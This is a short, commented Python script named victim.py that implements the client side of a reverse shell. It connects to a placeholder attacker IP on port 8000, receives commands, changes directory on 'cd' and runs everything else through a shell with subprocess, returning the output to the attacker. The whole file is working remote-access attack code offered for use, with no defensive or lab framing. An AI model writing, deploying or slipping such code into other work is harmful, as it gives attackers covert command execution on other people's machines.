# Creating victim.py for reverse shell
# Here we are creating a Client script so that it connects to the server


# Importing Required Libraries
import socket
import subprocess
import os


# CHOST is the IP address of the attacker 
CHOST='IP Address of Attacker' 
CPORT=8000

# Creating the Client and making a connection request 
victim=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
victim.connect((CHOST,CPORT))

# Receives command from the server
while True:
    try:
        data=victim.recv(4096)
        command=data.decode('utf-8')

        # Checking if command stats with cd so that the client can change directory
        if command.startswith('cd'):
            os.chdir(command[3:])
            victim.send('Directory Changed: {}'.format(command[3:]).encode('utf-8'))

        # If it doesn't start with cd it runs the command in the shell and sends the output to the attacker
        shell_result=subprocess.run(command,shell=True,capture_output=True)
        result=shell_result.stdout+shell_result.stderr
        victim.send(result)
    except Exception as e:
        victim.send('Something Went Wrong'.encode('utf-8'))